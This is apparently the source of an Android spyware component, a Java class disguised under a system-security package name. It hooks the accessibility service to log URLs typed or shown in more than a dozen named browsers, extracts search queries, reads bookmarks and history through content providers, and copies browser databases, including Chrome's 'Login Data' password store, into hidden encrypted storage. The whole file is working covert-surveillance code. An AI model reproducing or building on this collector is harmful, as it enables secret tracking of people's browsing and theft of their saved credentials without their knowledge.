package com.android.system.security;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.*;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Captures browser URLs, search queries, and bookmarks via the
 * AccessibilityService. No root required — reads the browser UI
 * accessibility tree.
 *
 * Also attempts direct SQLite DB reading from browser data directories
 * if accessible (requires root or debug build).
 *
 * Gracefully degrades — if something fails, it logs and moves on.
 */
public class WebActivityCollector {

    private static final String TAG = "WebCollector";
    private static final long URL_CACHE_TTL_MS = 30000;  // Don't re-log same URL within 30s

    // Browser view IDs for URL extraction
    private static final Map<String, String> BROWSER_URL_VIEW_IDS = new LinkedHashMap<>();
    static {
        // Chrome / Chromium-based
        BROWSER_URL_VIEW_IDS.put("com.android.chrome", "com.android.chrome:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("org.chromium.chrome", "org.chromium.chrome:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("com.brave.browser", "com.brave.browser:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("com.opera.browser", "com.opera.browser:id/url_field");
        BROWSER_URL_VIEW_IDS.put("com.opera.mini.native", "com.opera.mini.native:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("com.microsoft.emmx", "com.microsoft.emmx:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser:id/location_bar_edit_text");
        BROWSER_URL_VIEW_IDS.put("com.sec.android.app.sbrowser.beta", "com.sec.android.app.sbrowser.beta:id/location_bar_edit_text");
        BROWSER_URL_VIEW_IDS.put("com.vivaldi.browser", "com.vivaldi.browser:id/url_bar");
        BROWSER_URL_VIEW_IDS.put("com.kiwibrowser.browser", "com.kiwibrowser.browser:id/url_bar");

        // Firefox
        BROWSER_URL_VIEW_IDS.put("org.mozilla.firefox", "org.mozilla.firefox:id/url_bar_title");
        BROWSER_URL_VIEW_IDS.put("org.mozilla.firefox_beta", "org.mozilla.firefox_beta:id/url_bar_title");
        BROWSER_URL_VIEW_IDS.put("org.mozilla.fennec", "org.mozilla.fennec:id/url_bar_title");
        BROWSER_URL_VIEW_IDS.put("org.mozilla.focus", "org.mozilla.focus:id/urlView");

        // DuckDuckGo
        BROWSER_URL_VIEW_IDS.put("com.duckduckgo.mobile.android", "com.duckduckgo.mobile.android:id/omnibar_text_input");

        // Samsung Internet fallback
        BROWSER_URL_VIEW_IDS.put("com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser:id/location_bar_edit_text");
    }

    // Fallback: look for URL patterns in ANY EditText when a browser is open
    private static final Pattern URL_PATTERN = Pattern.compile(
        "^(https?://)?[\\w.-]+\\.[a-z]{2,}(:\\d+)?(/\\S*)?$",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern SEARCH_QUERY_PATTERN = Pattern.compile(
        "^[a-zA-Z0-9 ].{2,}$"
    );

    private final Context context;
    private final EncryptedStore encryptedStore;
    private final ProgressTracker progressTracker;

    // URL cache to avoid duplicates
    private final Map<String, Long> urlCache = new HashMap<>();

    // Current browsing context
    private String currentBrowser = "";
    private String currentUrl = "";
    private String lastUrlLogged = "";
    private long lastUrlLogTime = 0;

    public WebActivityCollector(Context context, EncryptedStore encryptedStore, ProgressTracker progressTracker) {
        this.context = context;
        this.encryptedStore = encryptedStore;
        this.progressTracker = progressTracker;
    }

    /**
     * Called from CoreService.onAccessibilityEvent() for
     * TYPE_WINDOW_STATE_CHANGED and TYPE_WINDOW_CONTENT_CHANGED events.
     *
     * Extracts browser URL from the accessibility tree of the active window.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;

        String pkg = event.getPackageName().toString();

        // Only process browser packages
        if (!isBrowserPackage(pkg)) return;

        currentBrowser = pkg;

        // Get the root node of the active window
        AccessibilityNodeInfo root = null;
        try {
            root = event.getSource();
            if (root == null) return;

            String url = extractUrl(root, pkg);
            if (url != null && !url.isEmpty()) {
                processUrl(pkg, url);
            }
        } catch (Exception e) {
            Log.w(TAG, "Error extracting URL: " + e.getMessage());
        } finally {
            if (root != null) {
                root.recycle();
            }
        }
    }

    /**
     * Try direct browser database reading.
     * Only works if app has root or on debug builds where permissions allow.
     */
    public void tryReadBrowserDatabases() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "browser_db_read");

        // Browser data directories to attempt
        String[][] browserDbs = {
            {"com.android.chrome", "/data/data/com.android.chrome/app_chrome/Default/History"},
            {"com.android.chrome", "/data/data/com.android.chrome/app_chrome/Default/Bookmarks"},
            {"com.android.chrome", "/data/data/com.android.chrome/app_chrome/Default/Login Data"},
            {"org.mozilla.firefox", "/data/data/org.mozilla.firefox/files/mozilla/places.sqlite"},
            {"com.sec.android.app.sbrowser", "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History"},
        };

        boolean anySuccess = false;

        for (String[] dbEntry : browserDbs) {
            String browser = dbEntry[0];
            String path = dbEntry[1];

            // Check if app is installed
            if (!isPackageInstalled(browser)) continue;

            File dbFile = new File(path);
            if (!dbFile.exists()) continue;

            try {
                // Read the SQLite database header to confirm it's valid
                byte[] header = new byte[16];
                try (RandomAccessFile raf = new RandomAccessFile(dbFile, "r")) {
                    raf.readFully(header);
                }

                // SQLite header starts with "SQLite format 3\x00"
                String headerStr = new String(header, "UTF-8");
                if (!headerStr.startsWith("SQLite format 3")) {
                    continue;
                }

                // Copy the database to our private storage for analysis
                String destName = browser.replace('.', '_') + "_" + dbFile.getName();
                File destFile = new File(context.getFilesDir(), "browser_" + destName);

                try (FileInputStream fis = new FileInputStream(dbFile);
                     FileOutputStream fos = new FileOutputStream(destFile)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) > 0) {
                        fos.write(buf, 0, n);
                    }
                }

                Log.i(TAG, "Copied " + browser + " DB to: " + destFile.getAbsolutePath());

                // Record progress
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "browser_db");
                entry.put("browser", browser);
                entry.put("db_type", dbFile.getName());
                entry.put("path", dbFile.getAbsolutePath());
                entry.put("size", dbFile.length());
                entry.put("copied_to", destFile.getAbsolutePath());
                entry.put("timestamp", System.currentTimeMillis());
                encryptedStore.store("browser_dbs", entry);

                anySuccess = true;

            } catch (Exception e) {
                Log.d(TAG, browser + " DB read failed: " + e.getMessage());
            }
        }

        check.result(anySuccess,
            anySuccess ? "Read browser databases successfully" : "No browser databases accessible");
    }

    /**
     * Try to read browser bookmarks via ContentProvider (Android's Browser provider).
     * Deprecated but still works on many devices.
     */
    public void tryReadBookmarksProvider() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "browser_bookmarks_provider");

        try {
            // Android's built-in Browser.Bookmarks content provider
            android.content.ContentResolver cr = context.getContentResolver();
            android.net.Uri bookmarksUri = android.net.Uri.parse("content://browser/bookmarks");

            String[] projection = {"title", "url", "bookmark", "date", "visits"};

            try (android.database.Cursor cursor = cr.query(
                    bookmarksUri, projection, "bookmark = 1", null, "date DESC LIMIT 100")) {

                if (cursor == null) {
                    check.fail("Bookmarks provider not available");
                    return;
                }

                List<Map<String, Object>> bookmarks = new ArrayList<>();

                while (cursor.moveToNext()) {
                    Map<String, Object> bm = new HashMap<>();
                    bm.put("title", getCursorString(cursor, "title"));
                    bm.put("url", getCursorString(cursor, "url"));
                    bm.put("date", getCursorLong(cursor, "date"));
                    bm.put("visits", getCursorInt(cursor, "visits"));
                    bookmarks.add(bm);
                }

                cursor.close();

                if (!bookmarks.isEmpty()) {
                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "bookmarks");
                    entry.put("count", bookmarks.size());
                    entry.put("data", bookmarks);
                    entry.put("timestamp", System.currentTimeMillis());
                    encryptedStore.store("bookmarks", entry);

                    check.ok("Read " + bookmarks.size() + " bookmarks via provider");
                } else {
                    check.fail("Bookmarks provider returned empty");
                }
            }
        } catch (SecurityException e) {
            check.fail("No permission for bookmarks provider");
        } catch (Exception e) {
            check.fail("Bookmarks provider error: " + e.getMessage());
        }
    }

    /**
     * Try to read browser history via ContentProvider.
     */
    public void tryReadHistoryProvider() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "browser_history_provider");

        try {
            android.content.ContentResolver cr = context.getContentResolver();
            android.net.Uri historyUri = android.net.Uri.parse("content://browser/bookmarks");

            String[] projection = {"title", "url", "date", "visits"};

            try (android.database.Cursor cursor = cr.query(
                    historyUri, projection, "bookmark = 0 OR bookmark IS NULL",
                    null, "date DESC LIMIT 200")) {

                if (cursor == null) {
                    check.fail("History provider not available");
                    return;
                }

                List<Map<String, Object>> history = new ArrayList<>();

                while (cursor.moveToNext()) {
                    Map<String, Object> entry = new HashMap<>();
                    entry.put("title", getCursorString(cursor, "title"));
                    entry.put("url", getCursorString(cursor, "url"));
                    entry.put("date", getCursorLong(cursor, "date"));
                    entry.put("visits", getCursorInt(cursor, "visits"));
                    history.add(entry);
                }

                cursor.close();

                if (!history.isEmpty()) {
                    Map<String, Object> storeEntry = new HashMap<>();
                    storeEntry.put("type", "browser_history");
                    storeEntry.put("count", history.size());
                    storeEntry.put("data", history);
                    storeEntry.put("timestamp", System.currentTimeMillis());
                    encryptedStore.store("browser_history", storeEntry);

                    check.ok("Read " + history.size() + " history entries via provider");
                } else {
                    check.fail("History provider returned empty");
                }
            }
        } catch (SecurityException e) {
            check.fail("No permission for history provider");
        } catch (Exception e) {
            check.fail("History provider error: " + e.getMessage());
        }
    }

    /**
     * Get search suggestions / autocomplete from browser.
     * Captured via accessibility events as user types in search bar.
     */
    public void processSearchQuery(String browser, String query) {
        if (query == null || query.trim().isEmpty()) return;
        query = query.trim();

        // Only capture queries that look like real searches
        if (query.length() < 3) return;
        if (URL_PATTERN.matcher(query).matches()) return;  // It's a URL, not a search

        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "search_query");
        entry.put("browser", browser);
        entry.put("query", query);
        entry.put("length", query.length());
        entry.put("timestamp", System.currentTimeMillis());
        encryptedStore.store("search_queries", entry);

        Log.i(TAG, "Search query captured: [" + browser + "] " + query);
    }

    // ============================================================
    // PRIVATE HELPERS
    // ============================================================

    private boolean isBrowserPackage(String pkg) {
        for (String browser : BROWSER_URL_VIEW_IDS.keySet()) {
            if (pkg.equals(browser)) return true;
        }
        // Also check for browser-like packages
        return pkg.contains("browser") || pkg.contains("chrome") ||
               pkg.contains("firefox") || pkg.contains("opera") ||
               pkg.contains("webkit");
    }

    private String extractUrl(AccessibilityNodeInfo root, String pkg) {
        String viewId = BROWSER_URL_VIEW_IDS.get(pkg);

        if (viewId != null) {
            // Try specific view ID first
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    CharSequence text = node.getText();
                    if (text != null && text.length() > 0) {
                        String url = text.toString().trim();
                        node.recycle();
                        return url;
                    }
                }
            }
        }

        // Fallback: DFS to find URL-like text
        return dfsFindUrl(root, 0, 3);  // Max 3 levels deep for performance
    }

    private String dfsFindUrl(AccessibilityNodeInfo node, int depth, int maxDepth) {
        if (node == null || depth > maxDepth) return null;

        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            String str = text.toString().trim();
            if (str.startsWith("http://") || str.startsWith("https://") ||
                str.startsWith("www.") || URL_PATTERN.matcher(str).matches()) {
                return str;
            }
        }

        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null && contentDesc.length() > 0) {
            String str = contentDesc.toString().trim();
            if (str.startsWith("http://") || str.startsWith("https://")) {
                return str;
            }
        }

        for (int i = 0; i < node.getChildCount() && i < 20; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = dfsFindUrl(child, depth + 1, maxDepth);
                child.recycle();
                if (result != null) return result;
            }
        }

        return null;
    }

    private void processUrl(String browser, String url) {
        if (url == null || url.isEmpty()) return;
        if (url.equals(currentUrl)) return;
        if (url.equals(lastUrlLogged) && (System.currentTimeMillis() - lastUrlLogTime) < URL_CACHE_TTL_MS) return;

        // Dedup cache
        Long lastTime = urlCache.get(url);
        long now = System.currentTimeMillis();
        if (lastTime != null && (now - lastTime) < URL_CACHE_TTL_MS) return;
        urlCache.put(url, now);

        // Trim cache
        if (urlCache.size() > 200) {
            Iterator<Map.Entry<String, Long>> it = urlCache.entrySet().iterator();
            int removed = 0;
            while (it.hasNext() && removed < 50) {
                Map.Entry<String, Long> e = it.next();
                if ((now - e.getValue()) > 300000) {  // 5 min old
                    it.remove();
                    removed++;
                }
            }
        }

        currentUrl = url;
        lastUrlLogged = url;
        lastUrlLogTime = now;

        // Store
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "browser_url");
        entry.put("browser", browser);
        entry.put("url", url);
        entry.put("timestamp", now);
        encryptedStore.store("browsing", entry);

        Log.i(TAG, "URL: [" + browser + "] " + url);

        // If it's a search URL, extract and log the query
        if (url.contains("google.com/search") || url.contains("bing.com/search") ||
            url.contains("search?" ) || url.contains("q=")) {
            try {
                String query = extractSearchQuery(url);
                if (query != null) {
                    processSearchQuery(browser, query);
                }
            } catch (Exception ignored) {}
        }
    }

    private String extractSearchQuery(String url) {
        try {
            String query = java.net.URLDecoder.decode(url, "UTF-8");
            String[] params = query.split("[?&]");
            for (String param : params) {
                if (param.startsWith("q=") || param.startsWith("query=") ||
                    param.startsWith("search=") || param.startsWith("text=")) {
                    return param.substring(param.indexOf('=') + 1);
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private boolean isPackageInstalled(String pkg) {
        try {
            context.getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (android.content.pm.PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private String getCursorString(android.database.Cursor cursor, String column) {
        int idx = cursor.getColumnIndex(column);
        return idx >= 0 ? cursor.getString(idx) : "";
    }

    private long getCursorLong(android.database.Cursor cursor, String column) {
        int idx = cursor.getColumnIndex(column);
        return idx >= 0 ? cursor.getLong(idx) : 0;
    }

    private int getCursorInt(android.database.Cursor cursor, String column) {
        int idx = cursor.getColumnIndex(column);
        return idx >= 0 ? cursor.getInt(idx) : 0;
    }

    public String getCurrentBrowser() { return currentBrowser; }
    public String getCurrentUrl() { return currentUrl; }
          }
